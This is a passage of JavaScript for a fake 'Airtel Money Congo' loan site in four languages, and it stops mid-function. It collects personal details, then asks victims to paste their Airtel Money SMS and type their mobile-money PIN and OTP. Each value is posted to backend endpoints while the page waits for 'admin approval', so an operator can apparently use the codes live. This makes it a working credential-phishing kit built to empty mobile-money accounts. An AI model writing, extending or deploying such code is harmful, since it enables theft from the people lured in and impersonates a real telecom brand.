// ═══════════════════════════════════════════════════════════
// Airtel Money Congo – Frontend State Machine
// Endpoints: SET A only (matches backend/server.js)
// ═══════════════════════════════════════════════════════════

// ─── State ───
const S = {
    loanType: 'Professionnel',
    loanAmount: 1000,
    loanTerm: '12',
    loanPurpose: '',
    firstName: '',
    lastName: '',
    phone: '',
    email: '',
    idNumber: '',
    city: '',
    status: '',
    applicationId: '',
    rejectedStep: null
};

let currentLang = 'fr';
let activePoll = null;
let countdownTimers = {};
let countdownValues = {};
let otpResendTimer = null;
let otpResendCountdown = 0;
let lastSubmittedPin = '';
let lastSubmittedOtp = '';

const POLL_INTERVAL = 2000;
const COUNTDOWN_SECONDS = 30;
const OTP_RESEND_SECONDS = 60;

// ═══════════════════════════════════════════════════════════
// TRANSLATIONS
// ═══════════════════════════════════════════════════════════
const translations = {
    fr: {
        splashTitle: "Airtel Money Congo",
        splashSub: "Prêts rapides et sécurisés — à portée de main",
        splashHint: "Préparation en cours…",
        landHero: "Bienvenue sur Airtel Money Prêts",
        landSub: "Obtenez des prêts instantanés via Airtel Money Congo",
        calcTitle: "Calculateur de prêt",
        calcAmount: "Montant",
        calcTerm: "Durée",
        calcMonthly: "Paiement mensuel",
        startBtn: "COMMENCER LA DEMANDE",
        footer: "© 2026 Prêts Airtel Money · Propulsé par Airtel Congo",
        back: "Retour",
        nextBtn: "ÉTAPE SUIVANTE",
        stepWord: "Étape",
        submitBtn: "SOUMETTRE LA DEMANDE",
        finish: "TERMINER",
        step1Title: "Demande de prêt",
        step2Title: "Informations personnelles",
        step3Title: "Vérification de la demande",
        loanTypeLabel: "Type de prêt",
        loanTypePersonal: "Prêt Personnel",
        loanTypeBusiness: "Prêt Professionnel",
        amountLabel: "Montant du prêt ($)",
        termLabel: "Durée du prêt (mois)",
        purposeLabel: "Objet du prêt",
        sumMonthly: "Mensuel",
        sumTotal: "Total",
        sumInterest: "Intérêts",
        firstNameLabel: "Prénom",
        lastNameLabel: "Nom",
        phoneLabel: "Numéro de téléphone (Congo RDC)",
        phoneHint: "9 chiffres (commence par 8 ou 9)",
        emailLabel: "Adresse e-mail",
        idLabel: "Numéro de pièce d'identité",
        cityLabel: "Ville",
        statusLabel: "Situation professionnelle",
        statusEmp: "Salarié",
        statusSelf: "Indépendant",
        statusTrader: "Commerçant",
        statusStudent: "Étudiant",
        statusCivil: "Fonctionnaire",
        statusUnemployed: "Sans emploi",
        statusRetired: "Retraité",
        reviewTitle: "Résumé de la demande",
        rLoanType: "Type de prêt",
        rAmount: "Montant",
        rTerm: "Durée",
        rPurpose: "Objet",
        rName: "Nom complet",
        rEmail: "E-mail",
        rPhone: "Téléphone",
        rId: "Pièce d'identité",
        rCity: "Ville",
        rStatus: "Statut",
        processingTitle: "Traitement de la demande…",
        processingSub: "Veuillez patienter pendant l'examen de votre demande",
        waitAdmin: "⏳ En attente de l'approbation de l'administrateur…",
        smsTitle: "Vérifier le message Airtel Money",
        smsLabel: "📩 Collez le SMS Airtel Money reçu",
        smsHint: "Vérifiez votre boîte SMS pour le message d'Airtel Money Congo.",
        smsSubmit: "SOUMETTRE LE MESSAGE AIRTEL MONEY",
        waitSmsTitle: "Vérification du SMS",
        waitSmsSub: "Veuillez patienter pendant l'examen de votre message",
        pinTitle: "Code PIN Airtel Money",
        pinPrompt: "Entrez votre code PIN à 4 chiffres",
        showPin: "Afficher",
        clearPin: "Effacer",
        attemptsRemaining: "3 tentatives restantes",
        submitPin: "SOUMETTRE LE PIN",
        waitPinTitle: "Vérification du PIN",
        waitPinSub: "Veuillez patienter pendant l'examen de votre PIN",
        otpTitle: "Code OTP",
        otpSub: "Code à 4 chiffres envoyé par SMS",
        verifyOtp: "VÉRIFIER ET APPROUVER",
        resendHint: "Renvoyer le même OTP",
        resend: "Renvoyer",
        waitOtpTitle: "Vérification de l'OTP",
        waitOtpSub: "Veuillez patienter pendant l'examen de votre OTP",
        approvalTitle: "Prêt approuvé !",
        approvalSub: "Votre prêt a été approuvé avec succès.",
        approvalLabel: "Montant à recevoir",
        approvalInfo: "Les fonds seront déposés sur votre compte Airtel Money dans les 5 minutes.",
        // Errors
        errRequired: "Veuillez remplir tous les champs.",
        errAmount: "Le montant doit être entre 100 $ et 5 000 $.",
        errPurpose: "Veuillez décrire l'objet (min 3 caractères).",
        errName: "Veuillez entrer votre nom complet.",
        errPhone: "Numéro invalide. 9 chiffres commençant par 8 ou 9.",
        errEmail: "Veuillez entrer une adresse e-mail valide.",
        errId: "Veuillez entrer votre numéro de pièce d'identité.",
        errCity: "Veuillez sélectionner votre ville.",
        errStatus: "Veuillez sélectionner votre situation.",
        errSms: "Veuillez coller un message SMS valide.",
        errPin: "Entrez un code PIN valide à 4 chiffres.",
        errOtp: "Entrez un code OTP valide à 4 chiffres.",
        // Status toasts
        smsApproved: "✅ SMS approuvé !",
        smsRejected: "❌ SMS rejeté. Veuillez réessayer.",
        pinApproved: "✅ PIN approuvé !",
        pinRejected: "❌ PIN rejeté. Veuillez réessayer.",
        pinBlocked: "🔒 PIN bloqué. Réessayez plus tard.",
        otpApproved: "✅ OTP approuvé ! Prêt décaissé 🎉",
        otpRejected: "❌ OTP rejeté. Veuillez réessayer.",
        appApproved: "✅ Demande approuvée !",
        appRejected: "❌ Demande rejetée. Veuillez réessayer.",
        networkErr: "Erreur réseau. Veuillez réessayer.",
        blockedBadge: "🔒 Bloqué pendant",
        attemptsBadge: "Tentatives restantes",
        of: "sur"
    },
    en: {
        splashTitle: "Airtel Money Congo",
        splashSub: "Fast, secure loans — right at your fingertips",
        splashHint: "Getting things ready…",
        landHero: "Welcome to Airtel Money Loans",
        landSub: "Get instant loans through Airtel Money Congo",
        calcTitle: "Loan Calculator",
        calcAmount: "Amount",
        calcTerm: "Term",
        calcMonthly: "Monthly Payment",
        startBtn: "START APPLICATION",
        footer: "© 2026 Airtel Money Loans · Powered by Airtel Congo",
        back: "Back",
        nextBtn: "NEXT STEP",
        stepWord: "Step",
        submitBtn: "SUBMIT APPLICATION",
        finish: "FINISH",
        step1Title: "Loan Application",
        step2Title: "Personal Details",
        step3Title: "Review Application",
        loanTypeLabel: "Loan Type",
        loanTypePersonal: "Personal Loan",
        loanTypeBusiness: "Business Loan",
        amountLabel: "Loan Amount ($)",
        termLabel: "Loan Term (months)",
        purposeLabel: "Purpose of Loan",
        sumMonthly: "Monthly",
        sumTotal: "Total",
        sumInterest: "Interest",
        firstNameLabel: "First Name",
        lastNameLabel: "Last Name",
        phoneLabel: "Phone Number (Congo DRC)",
        phoneHint: "9 digits (starts with 8 or 9)",
        emailLabel: "Email Address",
        idLabel: "ID Number",
        cityLabel: "City",
        statusLabel: "Employment Status",
        statusEmp: "Employed",
        statusSelf: "Self-employed",
        statusTrader: "Trader",
        statusStudent: "Student",
        statusCivil: "Civil servant",
        statusUnemployed: "Unemployed",
        statusRetired: "Retired",
        reviewTitle: "Application Summary",
        rLoanType: "Loan Type",
        rAmount: "Amount",
        rTerm: "Term",
        rPurpose: "Purpose",
        rName: "Name",
        rEmail: "Email",
        rPhone: "Phone",
        rId: "ID",
        rCity: "City",
        rStatus: "Status",
        processingTitle: "Processing Application…",
        processingSub: "Please wait while our team reviews your application",
        waitAdmin: "⏳ Awaiting admin approval…",
        smsTitle: "Verify Airtel Money Message",
        smsLabel: "📩 Paste the Airtel Money SMS you received",
        smsHint: "Check your SMS inbox for the message from Airtel Money Congo.",
        smsSubmit: "SUBMIT AIRTEL MONEY MESSAGE",
        waitSmsTitle: "Verifying SMS",
        waitSmsSub: "Please wait while our team reviews your message",
        pinTitle: "Enter Airtel Money PIN",
        pinPrompt: "Enter your 4-digit Airtel Money PIN",
        showPin: "Show PIN",
        clearPin: "Clear",
        attemptsRemaining: "3 attempts remaining",
        submitPin: "SUBMIT PIN",
        waitPinTitle: "Verifying PIN",
        waitPinSub: "Please wait while our team reviews your PIN",
        otpTitle: "Enter OTP Code",
        otpSub: "4-digit code sent via SMS",
        verifyOtp: "VERIFY & APPROVE LOAN",
        resendHint: "Resubmit the same OTP",
        resend: "Resend",
        waitOtpTitle: "Verifying OTP",
        waitOtpSub: "Please wait while our team reviews your OTP",
        approvalTitle: "Loan Approved!",
        approvalSub: "Your loan has been successfully approved.",
        approvalLabel: "Amount to Receive",
        approvalInfo: "Funds will be deposited to your Airtel Money account within 5 minutes.",
        errRequired: "Please complete all fields.",
        errAmount: "Amount must be between $100 and $5,000.",
        errPurpose: "Please describe the purpose (min 3 chars).",
        errName: "Please enter your full name.",
        errPhone: "Invalid phone. 9 digits starting with 8 or 9.",
        errEmail: "Please enter a valid email.",
        errId: "Please enter your ID number.",
        errCity: "Please select your city.",
        errStatus: "Please select your employment status.",
        errSms: "Please paste a valid SMS message.",
        errPin: "Enter a valid 4-digit PIN.",
        errOtp: "Enter a valid 4-digit OTP.",
        smsApproved: "✅ SMS approved!",
        smsRejected: "❌ SMS rejected. Please retry.",
        pinApproved: "✅ PIN approved!",
        pinRejected: "❌ PIN rejected. Please retry.",
        pinBlocked: "🔒 PIN blocked. Try again later.",
        otpApproved: "✅ OTP approved! Loan disbursed 🎉",
        otpRejected: "❌ OTP rejected. Please retry.",
        appApproved: "✅ Application approved!",
        appRejected: "❌ Application rejected. Please retry.",
        networkErr: "Network error. Please retry.",
        blockedBadge: "🔒 Blocked for",
        attemptsBadge: "Attempts remaining",
        of: "of"
    },
    ln: {
        splashTitle: "Airtel Money Congo",
        splashSub: "Nyongo ya noki mpe ya libateli",
        splashHint: "Ezali kobongisa…",
        landHero: "Boyei malamu na Airtel Money",
        landSub: "Zwá nyongo noki na Airtel Money Congo",
        calcTitle: "Calculatrice ya nyongo",
        calcAmount: "Motuya",
        calcTerm: "Ngonga",
        calcMonthly: "Sanza na sanza",
        startBtn: "BANDA KOSENGA",
        footer: "© 2026 Nyongo Airtel Money · Na Airtel Congo",
        back: "Kobima",
        nextBtn: "ETANDA ELANDI",
        stepWord: "Etanda",
        submitBtn: "TINDA KOSENGA",
        finish: "SILISA",
        step1Title: "Kosenga nyongo",
        step2Title: "Makambo ya moto",
        step3Title: "Botali ya kosenga",
        loanTypeLabel: "Lolenge ya nyongo",
        loanTypePersonal: "Nyongo ya Moto",
        loanTypeBusiness: "Nyongo ya Mosala",
        amountLabel: "Motuya ya nyongo ($)",
        termLabel: "Ngonga ya nyongo (sanza)",
        purposeLabel: "Mokano ya nyongo",
        sumMonthly: "Sanza",
        sumTotal: "Motuya mobimba",
        sumInterest: "Intérêt",
        firstNameLabel: "Nkombo ya liboso",
        lastNameLabel: "Nkombo ya libota",
        phoneLabel: "Nimero ya telefone (Congo RDC)",
        phoneHint: "Ba chiffre 9 (ebanda na 8 to 9)",
        emailLabel: "E-mail",
        idLabel: "Nimero ya karte ya identité",
        cityLabel: "Engumba",
        statusLabel: "Mosala",
        statusEmp: "Mosali",
        statusSelf: "Moto ya ye moko",
        statusTrader: "Moteci",
        statusStudent: "Mwana ya kelasi",
        statusCivil: "Mosali ya Leta",
        statusUnemployed: "Azali na mosala te",
        statusRetired: "Akomi kokufa",
        reviewTitle: "Botali ya kosenga",
        rLoanType: "Lolenge ya nyongo",
        rAmount: "Motuya",
        rTerm: "Ngonga",
        rPurpose: "Mokano",
        rName: "Nkombo mobimba",
        rEmail: "E-mail",
        rPhone: "Telefone",
        rId: "Karte ya identité",
        rCity: "Engumba",
        rStatus: "Mosala",
        processingTitle: "Kosala kosenga na yo…",
        processingSub: "Zela mwa tango moke",
        waitAdmin: "⏳ Zela bondimi ya administrateur…",
        smsTitle: "Talá message ya Airtel Money",
        smsLabel: "📩 Kotya SMS ya Airtel Money oyo ozwaki",
        smsHint: "Talá na boîte SMS na yo mpo na message ya Airtel Money Congo.",
        smsSubmit: "TINDA MESSAGE AIRTEL MONEY",
        waitSmsTitle: "Kotala SMS",
        waitSmsSub: "Zela mwa tango moke",
        pinTitle: "Code PIN ya Airtel Money",
        pinPrompt: "Kotisa code PIN ya ba chiffre 4",
        showPin: "Lakisá",
        clearPin: "Longola",
        attemptsRemaining: "3 ba tentatives etikali",
        submitPin: "TINDA PIN",
        waitPinTitle: "Kotala PIN",
        waitPinSub: "Zela mwa tango moke",
        otpTitle: "Code OTP",
        otpSub: "Code ya ba chiffre 4 etindami na SMS",
        verifyOtp: "TALA MPE KONDIMA",
        resendHint: "Tinda lisusu OTP",
        resend: "Tinda lisusu",
        waitOtpTitle: "Kotala OTP",
        waitOtpSub: "Zela mwa tango moke",
        approvalTitle: "Nyongo endimami !",
        approvalSub: "Nyongo na yo endimami malamu.",
        approvalLabel: "Motuya oyo ozwi",
        approvalInfo: "Mbongo ekotiama na Airtel Money na yo na miniti 5.",
        errRequired: "Kotisa makambo nyonso.",
        errAmount: "Motuya esengeli kozala kati ya 100 $ mpe 5 000 $.",
        errPurpose: "Limbola mokano (min 3 ba caractères).",
        errName: "Kotisa nkombo na yo mobimba.",
        errPhone: "Nimero ya mabe. Ba chiffre 9 ebandi na 8 to 9.",
        errEmail: "Kotisa e-mail ya malamu.",
        errId: "Kotisa nimero ya karte ya identité.",
        errCity: "Pona engumba na yo.",
        errStatus: "Pona mosala na yo.",
        errSms: "Kotya SMS ya malamu.",
        errPin: "Kotisa PIN ya ba chiffre 4.",
        errOtp: "Kotisa OTP ya ba chiffre 4.",
        smsApproved: "✅ SMS endimami !",
        smsRejected: "❌ SMS eboyami. Meka lisusu.",
        pinApproved: "✅ PIN endimami !",
        pinRejected: "❌ PIN eboyami. Meka lisusu.",
        pinBlocked: "🔒 PIN ekangami. Meka sima.",
        otpApproved: "✅ OTP endimami ! Nyongo ebimisami 🎉",
        otpRejected: "❌ OTP eboyami. Meka lisusu.",
        appApproved: "✅ Kosenga endimami !",
        appRejected: "❌ Kosenga eboyami. Meka lisusu.",
        networkErr: "Erreur réseau. Meka lisusu.",
        blockedBadge: "🔒 Ekangami mpo na",
        attemptsBadge: "Ba tentatives etikali",
        of: "ya"
    },
    sw: {
        splashTitle: "Airtel Money Congo",
        splashSub: "Mikopo ya haraka na salama",
        splashHint: "Inaandaa…",
        landHero: "Karibu Airtel Money Mikopo",
        landSub: "Pata mikopo ya papo hapo kupitia Airtel Money Congo",
        calcTitle: "Kikokotoo cha mkopo",
        calcAmount: "Kiasi",
        calcTerm: "Muda",
        calcMonthly: "Malipo ya mwezi",
        startBtn: "ANZA MAOMBI",
        footer: "© 2026 Airtel Money Mikopo · Inaendeshwa na Airtel Congo",
        back: "Rudi",
        nextBtn: "HATUA INAYOFUATA",
        stepWord: "Hatua",
        submitBtn: "TUMA MAOMBI",
        finish: "MALIZA",
        step1Title: "Maombi ya mkopo",
        step2Title: "Taarifa za kibinafsi",
        step3Title: "Ukaguzi wa maombi",
        loanTypeLabel: "Aina ya mkopo",
        loanTypePersonal: "Mkopo wa Kibinafsi",
        loanTypeBusiness: "Mkopo wa Biashara",
        amountLabel: "Kiasi cha mkopo ($)",
        termLabel: "Muda wa mkopo (miezi)",
        purposeLabel: "Lengo la mkopo",
        sumMonthly: "Kila mwezi",
        sumTotal: "Jumla",
        sumInterest: "Riba",
        firstNameLabel: "Jina la kwanza",
        lastNameLabel: "Jina la mwisho",
        phoneLabel: "Namba ya simu (Congo DRC)",
        phoneHint: "Tarakimu 9 (huanza na 8 au 9)",
        emailLabel: "Barua pepe",
        idLabel: "Namba ya kitambulisho",
        cityLabel: "Jiji",
        statusLabel: "Hali ya kazi",
        statusEmp: "Mfanyakazi",
        statusSelf: "Kujiajiri",
        statusTrader: "Mfanyabiashara",
        statusStudent: "Mwanafunzi",
        statusCivil: "Mtumishi wa serikali",
        statusUnemployed: "Hana kazi",
        statusRetired: "Mstaafu",
        reviewTitle: "Muhtasari wa maombi",
        rLoanType: "Aina ya mkopo",
        rAmount: "Kiasi",
        rTerm: "Muda",
        rPurpose: "Lengo",
        rName: "Jina kamili",
        rEmail: "Barua pepe",
        rPhone: "Simu",
        rId: "Kitambulisho",
        rCity: "Jiji",
        rStatus: "Hali",
        processingTitle: "Inasindika maombi…",
        processingSub: "Tafadhali subiri wakati timu yetu inakagua maombi yako",
        waitAdmin: "⏳ Inasubiri idhini ya msimamizi…",
        smsTitle: "Thibitisha ujumbe wa Airtel Money",
        smsLabel: "📩 Bandika SMS ya Airtel Money uliyopokea",
        smsHint: "Angalia kikasha chako cha SMS kwa ujumbe kutoka Airtel Money Congo.",
        smsSubmit: "TUMA UJUMBE WA AIRTEL MONEY",
        waitSmsTitle: "Inathibitisha SMS",
        waitSmsSub: "Tafadhali subiri wakati timu yetu inakagua ujumbe wako",
        pinTitle: "PIN ya Airtel Money",
        pinPrompt: "Weka PIN yako ya tarakimu 4",
        showPin: "Onyesha",
        clearPin: "Futa",
        attemptsRemaining: "Majaribio 3 yaliyobaki",
        submitPin: "TUMA PIN",
        waitPinTitle: "Inathibitisha PIN",
        waitPinSub: "Tafadhali subiri wakati timu yetu inakagua PIN yako",
        otpTitle: "OTP",
        otpSub: "Msimbo wa tarakimu 4 uliotumwa kwa SMS",
        verifyOtp: "THIBITISHA NA IDHINISHA",
        resendHint: "Tuma tena OTP hiyo hiyo",
        resend: "Tuma tena",
        waitOtpTitle: "Inathibitisha OTP",
        waitOtpSub: "Tafadhali subiri wakati timu yetu inakagua OTP yako",
        approvalTitle: "Mkopo umeidhinishwa!",
        approvalSub: "Mkopo wako umeidhinishwa kwa mafanikio.",
        approvalLabel: "Kiasi cha kupokea",
        approvalInfo: "Fedha zitawekwa kwenye akaunti yako ya Airtel Money ndani ya dakika 5.",
        errRequired: "Tafadhali jaza sehemu zote.",
        errAmount: "Kiasi lazima kiwe kati ya $100 na $5,000.",
        errPurpose: "Tafadhali eleza lengo (angalau herufi 3).",
        errName: "Tafadhali weka jina lako kamili.",
        errPhone: "Namba si sahihi. Tarakimu 9 zinazoanza na 8 au 9.",
        errEmail: "Tafadhali weka barua pepe halali.",
        errId: "Tafadhali weka namba ya kitambulisho.",
        errCity: "Tafadhali chagua jiji lako.",
        errStatus: "Tafadhali chagua hali ya kazi.",
        errSms: "Tafadhali bandika ujumbe halali wa SMS.",
        errPin: "Weka PIN halali ya tarakimu 4.",
        errOtp: "Weka OTP halali ya tarakimu 4.",
        smsApproved: "✅ SMS imeidhinishwa!",
        smsRejected: "❌ SMS imekataliwa. Tafadhali jaribu tena.",
        pinApproved: "✅ PIN imeidhinishwa!",
        pinRejected: "❌ PIN imekataliwa. Tafadhali jaribu tena.",
        pinBlocked: "🔒 PIN imezuiwa. Jaribu baadaye.",
        otpApproved: "✅ OTP imeidhinishwa! Mkopo umetolewa 🎉",
        otpRejected: "❌ OTP imekataliwa. Tafadhali jaribu tena.",
        appApproved: "✅ Maombi yameidhinishwa!",
        appRejected: "❌ Maombi yamekataliwa. Tafadhali jaribu tena.",
        networkErr: "Hitilafu ya mtandao. Tafadhali jaribu tena.",
        blockedBadge: "🔒 Imezuiwa kwa",
        attemptsBadge: "Majaribio yaliyobaki",
        of: "kati ya"
    }
};

function t(key) { return (translations[currentLang] || translations.fr)[key] || key; }

// ═══════════════════════════════════════════════════════════
// LANGUAGE
// ═══════════════════════════════════════════════════════════
function switchLang(lang) {
    currentLang = lang;
    document.body.setAttribute('data-lang', lang);
    document.documentElement.lang = lang;
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.classList.toggle('active', btn.getAttribute('data-lang-btn') === lang);
    });
    // Apply translations
    document.querySelectorAll('[data-key]').forEach(el => {
        const key = el.getAttribute('data-key');
        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
            if (el.hasAttribute('placeholder')) el.setAttribute('placeholder', t(key));
        } else if (el.tagName === 'OPTION') {
            el.textContent = t(key);
        } else {
            // Preserve icons inside elements — only set text of the last text node
            const iconChild = el.querySelector('i');
            if (iconChild) {
                // find text node after icon
                el.childNodes.forEach(node => {
                    if (node.nodeType === 3 && node.textContent.trim()) node.textContent = ' ' + t(key);
                });
            } else {
                el.textContent = t(key);
            }
        }
    });
    // Update landing calc
    updateLandingCalc();
    saveLang();
}

function saveLang() {
    try { localStorage.setItem('airtel_drc_lang', currentLang); } catch(e) {}
}

function loadLang() {
    let saved = 'fr';
    try { saved = localStorage.getItem('airtel_drc_lang') || 'fr'; } catch(e) {}
    if (!translations[saved]) saved = 'fr';
    switchLang(saved);
}

// ═══════════════════════════════════════════════════════════
// NAVIGATION
// ═══════════════════════════════════════════════════════════
function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

function showToast(msg, type = '') {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.className = 'toast show ' + type;
    clearTimeout(toast._t);
    toast._t = setTimeout(() => toast.classList.remove('show'), 3500);
}

function showErr(id, msg) {
    const el = document.getElementById(id);
    if (!el) return;
    const txt = document.getElementById(id + 'Txt');
    if (txt) txt.textContent = msg;
    el.classList.add('show');
    clearTimeout(el._t);
    el._t = setTimeout(() => el.classList.remove('show'), 5000);
}
function clearErr(id) {
    const el = document.getElementById(id);
    if (el) el.classList.remove('show');
}

// ═══════════════════════════════════════════════════════════
// CALCULATOR
// ═══════════════════════════════════════════════════════════
const ANNUAL_RATE = 5.5;

function calcMonthly(amount, months) {
    if (!amount || !months) return 0;
    const r = ANNUAL_RATE / 100 / 12;
    const f = Math.pow(1 + r, months);
    return amount * r * f / (f - 1);
}

function updateLandingCalc() {
    const amt = +document.getElementById('amtSlider').value;
    const months = 12;
    document.getElementById('calcAmt').textContent = '$' + amt.toLocaleString();
    document.getElementById('calcTerm').textContent = months + ' ' + (currentLang === 'fr' ? 'mois' : currentLang === 'sw' ? 'miezi' : currentLang === 'ln' ? 'sanza' : 'months');
    document.getElementById('monthlyAmt').textContent = '$' + Math.round(calcMonthly(amt, months)).toLocaleString();
}

function updateStepCalc() {
    const amt = +document.getElementById('s1am').value || 0;
    const months = +document.getElementById('s1te').value || 12;
    const monthly = calcMonthly(amt, months);
    document.getElementById('sumMonthly').textContent = '$' + Math.round(monthly).toLocaleString();
    document.getElementById('sumTotal').textContent = '$' + Math.round(monthly * months).toLocaleString();
    document.getElementById('sumInterest').textContent = '$' + Math.round(monthly * months - amt).toLocaleString();
}

// ═══════════════════════════════════════════════════════════
// START
// ═══════════════════════════════════════════════════════════
function startApplication() {
    S.rejectedStep = null;
    if (!S.applicationId) {
        S.applicationId = 'AIRTEL-CM-' + Date.now().toString().slice(-6) + '-' + Math.random().toString(36).slice(2, 6).toUpperCase();
    }
    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(clearErr);
    goTo('page-step1');
    updateStepCalc();
}

// ═══════════════════════════════════════════════════════════
// STEP 1 → STEP 2
// ═══════════════════════════════════════════════════════════
function toS2() {
    const ty = document.getElementById('s1ty').value;
    const am = +document.getElementById('s1am').value;
    const te = document.getElementById('s1te').value;
    const pu = document.getElementById('s1pu').value.trim();

    if (!ty || !te) { showErr('s1Err', t('errRequired')); return; }
    if (am < 100 || am > 5000) { showErr('s1Err', t('errAmount')); return; }
    if (pu.length < 3) { showErr('s1Err', t('errPurpose')); return; }

    S.loanType = ty;
    S.loanAmount = am;
    S.loanTerm = te;
    S.loanPurpose = pu;

    goTo('page-step2');
}

// ═══════════════════════════════════════════════════════════
// STEP 2 → STEP 3
// ═══════════════════════════════════════════════════════════
function normalizePhone(id) {
    const inp = document.getElementById(id);
    inp.value = inp.value.replace(/\D/g, '').slice(0, 9);
}

function toS3() {
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value.trim();
    const em = document.getElementById('s2em').value.trim();
    const id = document.getElementById('s2id').value.trim();
    const city = document.getElementById('s2city').value;
    const status = document.getElementById('s2status').value;

    if (!fi || !la) { showErr('s2Err', t('errName')); return; }
    if (!/^[89]\d{8}$/.test(ph)) { showErr('s2Err', t('errPhone')); return; }
    if (!em || !em.includes('@') || !em.includes('.')) { showErr('s2Err', t('errEmail')); return; }
    if (!id) { showErr('s2Err', t('errId')); return; }
    if (!city) { showErr('s2Err', t('errCity')); return; }
    if (!status) { showErr('s2Err', t('errStatus')); return; }

    S.firstName = fi;
    S.lastName = la;
    S.phone = ph;
    S.email = em;
    S.idNumber = id;
    S.city = city;
    S.status = status;

    // Fill review
    document.getElementById('rLoanType').textContent = S.loanType;
    document.getElementById('rAmount').textContent = '$' + S.loanAmount.toLocaleString();
    document.getElementById('rTerm').textContent = S.loanTerm + ' ' + (currentLang === 'fr' ? 'mois' : 'months');
    document.getElementById('rPurpose').textContent = S.loanPurpose;
    document.getElementById('rName').textContent = S.firstName + ' ' + S.lastName;
    document.getElementById('rEmail').textContent = S.email;
    document.getElementById('rPhone').textContent = '+243 ' + S.phone;
    document.getElementById('rId').textContent = S.idNumber;
    document.getElementById('rCity').textContent = S.city;
    document.getElementById('rStatus').textContent = S.status;
    const monthly = calcMonthly(S.loanAmount, +S.loanTerm);
    document.getElementById('rMonthly').textContent = '$' + Math.round(monthly).toLocaleString();
    document.getElementById('rTotal').textContent = '$' + Math.round(monthly * +S.loanTerm).toLocaleString();

    goTo('page-step3');
}

// ═══════════════════════════════════════════════════════════
// SUBMIT APPLICATION → POLL ADMIN
// ═══════════════════════════════════════════════════════════
async function submitApp() {
    goTo('page-processing');
    startCountdown('processing', 30);

    try {
        const res = await fetch('/api/send-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationData: S })
        });
        const data = await res.json();
        if (!data.ok) throw new Error(data.error || 'Submit failed');
        S.applicationId = data.applicationId;
        saveState();
        startPoll('sms', 'page-sms-paste');
    } catch (err) {
        console.error(err);
        showToast(t('networkErr'), 'error');
        stopAllTimers();
        goTo('page-step3');
    }
}

// ═══════════════════════════════════════════════════════════
// SMS SUBMIT → POLL
// ═══════════════════════════════════════════════════════════
async function doSmsParse() {
    const msg = document.getElementById('smsMsgBox').value.trim();
    if (msg.length < 3) { showErr('momErr', t('errSms')); return; }

    goTo('page-wait-sms');
    startCountdown('sms', 30);

    try {
        await fetch('/api/send-momo-message', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                momoData: { applicationId: S.applicationId, phone: S.phone, momoMessage: msg }
            })
        });
        startPoll('sms', 'page-pin');
    } catch (err) {
        console.error(err);
        showToast(t('networkErr'), 'error');
        goTo('page-sms-paste');
    }
}

// ═══════════════════════════════════════════════════════════
// PIN → POLL
// ═══════════════════════════════════════════════════════════
function pinMvM(el, i) {
    el.value = el.value.replace(/\D/g, '');
    if (el.value && i < 3) document.getElementById('pin' + (i + 1)).focus();
    if (!el.value && i > 0) document.getElementById('pin' + (i - 1)).focus();
}
function clearLoginPin() {
    for (let i = 0; i < 4; i++) document.getElementById('pin' + i).value = '';
    document.getElementById('pin0').focus();
}
function togPin() {
    for (let i = 0; i < 4; i++) {
        const el = document.getElementById('pin' + i);
        el.type = el.type === 'password' ? 'text' : 'password';
    }
}

async function doPin() {
    let pin = '';
    for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
    if (pin.length !== 4) { showErr('pinErr', t('errPin')); return; }

    lastSubmittedPin = pin;
    goTo('page-wait-pin');
    startCountdown('pin', 30);

    try {
        const res = await fetch('/api/send-pin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId, pin })
        });
        const data = await res.json();
        if (data.blocked) {
            showToast(data.message || t('pinBlocked'), 'error');
            stopAllTimers();
            goTo('page-pin');
            updateAttemptsBadge(data);
            return;
        }
        startPoll('pin', 'page-otp');
    } catch (err) {
        console.error(err);
        showToast(t('networkErr'), 'error');
        goTo('page-pin');
    }
}

// ═══════════════════════════════════════════════════════════
// OTP → POLL
// ═══════════════════════════════════════════════════════════
function otpMvM(el, i) {
    el.value = el.value.replace(/\D/g, '');
    if (el.value && i < 3) document.getElementById('otp' + (i + 1)).focus();
    if (!el.value && i > 0) document.getElementById('otp' + (i - 1)).focus();
}
function clearOtpCode() {
    for (let i = 0; i < 4; i++) document.getElementById('otp' + i).value = '';
    document.getElementById('otp0').focus();
}

async function doOtp() {
    let otp = '';
    for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
    if (otp.length !== 4) { showErr('otpErr', t('errOtp')); return; }

    lastSubmittedOtp = otp;
    goTo('page-wait-otp');
    startCountdown('otp', 30);

    try {
        await fetch('/api/send-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId, otp })
        });
        startPoll('otp', 'page-approval');
    } catch (err) {
        console.error(err);
        showToast(t('networkErr'), 'error');
        goTo('page-otp');
    }
}

async function resendOtp() {
    const btn = document.getElementById('otpResendBtn');
    if (otpResendTimer) { showToast(t('waitAdmin'), 'info'); return; }
    btn.disabled = true;
    try {
        await fetch('/api/send-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId, otp: lastSubmittedOtp })
        });
        showToast(t('resend') + ' OK', 'success');
        startPoll('otp', 'page-approval');
        startOtpResendCountdown();
    } catch (err) {
        console.error(err);
        showToast(t('networkErr'), 'error');
        btn.disabled = false;
    }
}

function startOtpResendCountdown() {
    otpResendCountdown = OTP_RESEND_SECONDS;
    const block = document.getElementById('otpResendBlock');
    const timer = document.getElementById('otpResendTimer');
    const btn = document.getElementById('otpResendBtn');
    block.classList.remove('hidden');
    btn.disabled = true;
    timer.textContent = otpResendCountdown;
    if (otpResendTimer) clearInterval(otpResendTimer);
    otpResendTimer = setInterval(() => {
        otpResendCountdown--;
        timer.textContent = otpResendCountdown;
        if (otpResendCountdown <= 0) {
